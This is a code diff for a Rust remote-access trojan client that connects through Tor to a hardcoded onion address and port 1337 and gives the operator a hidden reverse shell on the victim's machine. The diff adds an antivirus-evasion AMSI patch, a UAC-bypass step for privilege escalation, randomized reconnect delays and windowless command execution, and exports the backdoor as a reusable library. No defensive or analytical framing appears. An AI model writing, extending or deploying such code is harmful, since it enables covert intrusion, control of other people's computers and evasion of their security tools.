@@ -1,6 +1,6 @@
-
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
-
+#[cfg(target_os = "windows")]
+use artirat_client::{amsi_patch,uac_bypass};
 use std::env;
 use arti_client::{TorClient, TorClientConfig, DataStream};
 use tor_rtcompat::PreferredRuntime;
@@ -11,11 +11,71 @@ use tokio::process::Command;
 use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
-use rand::{Rng};
+use rand::Rng;
 
+/// Public configuration struct (so lib users can customize)
+#[derive(Clone, Debug)]
+pub struct ClientConfig {
+    pub onion: String,
+    pub port: u16,
+}
 
+impl Default for ClientConfig {
+    fn default() -> Self {
+        Self {
+            onion: "7i6xbfs5e7uxxvjadr2nse3yeirqs5oolkypnajr37puw22uhkwz7nqd.onion".into(),
+            port: 1337,
+        }
+    }
+}
+
+/// Initialize Tor client (exported for lib usage)
+pub async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
+    let config = TorClientConfig::default();
+    let client = TorClient::create_bootstrapped(config).await?;
+    println!("Initialized Tor Client");
+    Ok(client)
+}
+pub fn is_admin() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        use windows::Win32::Foundation::CloseHandle;
+        use windows::Win32::Security::{
+            GetTokenInformation, OpenProcessToken, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
+        };
+        use windows::Win32::System::Threading::GetCurrentProcess;
+
+        unsafe {
+            let mut token = Default::default();
+
+            if !OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).as_bool() {
+                return false;
+            }
+
+            let mut elevation = TOKEN_ELEVATION::default();
+            let mut size = 0;
+
+            let result = GetTokenInformation(
+                token,
+                TokenElevation,
+                Some(&mut elevation as *mut _ as *mut _),
+                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
+                &mut size,
+            );
+
+            CloseHandle(token);
+
+            result.as_bool() && elevation.TokenIsElevated != 0
+        }
+    }
+
+    #[cfg(target_family = "unix")]
+    {
+        unsafe { libc::geteuid() == 0 }
+    }
+}
 /// Build prompt string
-fn build_prompt() -> String {
+pub fn build_prompt() -> String {
     let user = std::env::var("USER")
         .or_else(|_| std::env::var("USERNAME"))
         .unwrap_or_else(|_| "unknown".into());
@@ -32,13 +92,12 @@ fn build_prompt() -> String {
 }
 
 /// Execute a command
-async fn run_command(input: &str) -> Result<Vec<u8>> {
+pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let mut parts = input.trim().split_whitespace();
 
     let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
     let args: Vec<&str> = parts.collect();
 
-    // --- Handle `cd` manually ---
     if cmd == "cd" {
         let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;
 
@@ -53,13 +112,12 @@ async fn run_command(input: &str) -> Result<Vec<u8>> {
         }
     }
 
-    // --- Cross-platform command execution ---
     #[cfg(target_os = "windows")]
     let mut command = {
         let mut c = Command::new("cmd.exe");
         c.arg("/C")
             .arg(input)
-            .creation_flags(0x08000000); // CREATE_NO_WINDOW
+            .creation_flags(0x08000000);
         c
     };
 
@@ -76,20 +134,19 @@ async fn run_command(input: &str) -> Result<Vec<u8>> {
     result.extend_from_slice(&output.stdout);
     result.extend_from_slice(&output.stderr);
 
-    // Ensure something is always sent
     if result.is_empty() {
         result.extend_from_slice(b"(no output)\n");
     }
 
-    // Ensure newline at end (important for ncat display)
     if !result.ends_with(b"\n") {
         result.push(b'\n');
     }
 
     Ok(result)
 }
-/// Connect to an onion service
-async fn connect_onion(
+
+/// Connect to onion service
+pub async fn connect_onion(
     tor_client: &TorClient<PreferredRuntime>,
     onion_addr: &str,
     port: u16,
@@ -97,14 +154,13 @@ async fn connect_onion(
     Ok(tor_client.connect((onion_addr, port)).await?)
 }
 
-/// Read loop
-async fn read_loop(stream: DataStream) -> Result<()> {
+/// Session loop
+pub async fn read_loop(stream: DataStream) -> Result<()> {
     let (mut reader, mut writer) = split(stream);
 
     let mut buf = [0u8; 4096];
     let mut buffer = String::new();
 
-    // ✅ Send initial prompt
     writer.write_all(build_prompt().as_bytes()).await?;
     writer.flush().await?;
 
@@ -125,7 +181,6 @@ async fn read_loop(stream: DataStream) -> Result<()> {
             line = line.trim().to_string();
 
             if line.is_empty() {
-                // still reprint prompt
                 writer.write_all(build_prompt().as_bytes()).await?;
                 writer.flush().await?;
                 continue;
@@ -134,7 +189,6 @@ async fn read_loop(stream: DataStream) -> Result<()> {
             let output = run_command(&line).await?;
             writer.write_all(&output).await?;
 
-            // ✅ Send updated prompt (after command, so cwd updates after `cd`)
             writer.write_all(build_prompt().as_bytes()).await?;
             writer.flush().await?;
         }
@@ -143,22 +197,17 @@ async fn read_loop(stream: DataStream) -> Result<()> {
     Ok(())
 }
 
-#[tokio::main]
-async fn main() -> Result<()> {
-    
-    let onion = "7i6xbfs5e7uxxvjadr2nse3yeirqs5oolkypnajr37puw22uhkwz7nqd.onion";
-    let port = 1337;
-
+/// Core runner (THIS is what you export for lib usage)
+pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     loop {
         println!("Attempting to connect...");
-        let config = TorClientConfig::default();
-        let tor_client = TorClient::create_bootstrapped(config).await?;
-        println!("Initialized Tor Client");
-        match connect_onion(&tor_client, onion, port).await {
+
+        let tor_client = init_tor().await?;
+
+        match connect_onion(&tor_client, &config.onion, config.port).await {
             Ok(stream) => {
                 println!("Connected to onion service");
 
-                // Run the session
                 if let Err(e) = read_loop(stream).await {
                     println!("Session error: {}", e);
                 }
@@ -169,9 +218,32 @@ async fn main() -> Result<()> {
                 println!("Connection failed: {}", e);
             }
         }
+
         let mut rng = rand::thread_rng();
         let delay: u64 = rng.gen_range(31..=121);
+
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
+}
+
+/// Exportable async entrypoint for library users
+pub async fn netclient() -> Result<()> {
+    #[cfg(target_os = "windows")]
+    amsi_patch::amsi_patch();
+    let exe_path = env::current_exe()?;
+    let exe_path_str = exe_path.to_string_lossy().to_string();
+    if is_admin(){
+        netclient_run(ClientConfig::default()).await
+    } else {
+        #[cfg(target_os = "windows")]
+        uac_bypass::generate_inf_file(exe_path_str);
+        netclient_run(ClientConfig::default()).await
+    }
+}
+
+/// Actual binary entrypoint (thin wrapper)
+#[tokio::main]
+async fn main() -> Result<()> {
+    netclient().await
 }
